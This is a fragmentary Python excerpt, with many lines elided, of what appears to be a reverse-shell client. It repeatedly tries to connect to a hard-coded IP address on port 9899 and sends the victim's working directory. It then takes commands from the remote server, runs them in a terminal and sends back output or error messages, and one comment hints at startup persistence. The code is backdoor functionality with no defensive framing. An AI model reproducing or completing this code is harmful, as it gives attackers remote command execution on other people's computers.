...
def connect():
    ...
    while (connected == False):
        try:
            port = 9899
            s.connect(('17.17.2.101', port))
            # Connected
            connected = True

            # Sending Current Working Directory Of Client To Server
            cwd = os.getcwd()
    ...
    while True:
        try:
            ...
            # Changing Working Directory Of Client
            # Example: D:\
            ...
            # Example: starup T.py
                ...
                # If Failed, Send Exception Message To Server
            ...
            # Command Will Be Executed In Terminal
                ...
                # If There Is No Output And No Error
                # Send OK
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))

        # If Server Command Was Unable To Be Executed
        except Exception as e:

            # Send Exception Message To Server
            s.send(str(e).encode('utf-8'))
